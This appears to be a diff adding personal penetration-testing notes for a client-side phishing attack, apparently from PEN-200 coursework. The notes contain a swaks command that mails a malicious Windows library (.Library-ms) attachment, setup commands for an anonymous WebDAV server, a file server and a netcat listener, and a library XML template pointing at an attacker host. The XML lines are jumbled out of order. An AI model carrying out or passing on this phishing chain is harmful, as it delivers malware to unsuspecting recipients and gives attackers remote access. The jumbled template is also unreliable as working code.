@@ -1,0 +1,49 @@
+steps.ClientSideAttack
+
+
+
+Send email with swaks
+
+Swaks Command
+ Sending config.Library-ms payload as attachment
+        
+  sudo swaks -t <targetID1>@<domain> -t <targetID1>@<domain> --from <userSender>@<domain> --attach @config.Library-ms \ 
+  --server <emailServer> --body @body.txt --header "Subject: Staging Script" \ 
+  --suppress-data -au <userSender> -ap ' <passwordSender>'
+
+
+
+Phish Attack Commands
+        
+  Commands to set up Phish attack:
+    WebDav server: /home/beed2112/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/beed2112/pen-200/beyond/webdav/
+    Serve powercast: export MYHTTPD=5150 && docker run -it --rm -p $MYHTTPD:8000 -v $PWD:/app/public --name gohttpserver docker.io/codeskyblue/gohttpserver:latest --upload
+    Start nc listener: nc -lvp 
+    Send Phish email: <see above swaks command>
+
+
+Example library file 
+<save as config.Labrary-ms>
+
+
+###Start
+ <?xml version="1.0" encoding="UTF-8"?>
+</libraryDescription>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</simpleLocation>
+</templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+<iconReference>imageres.dll,-1003</iconReference>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isLibraryPinned>true</isLibraryPinned>
+<isSupported>false</isSupported>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<searchConnectorDescription>
+<searchConnectorDescriptionList>
+<simpleLocation>
+<templateInfo>
+<url>http://<attacker></url>
+<version>6</version>
+###End
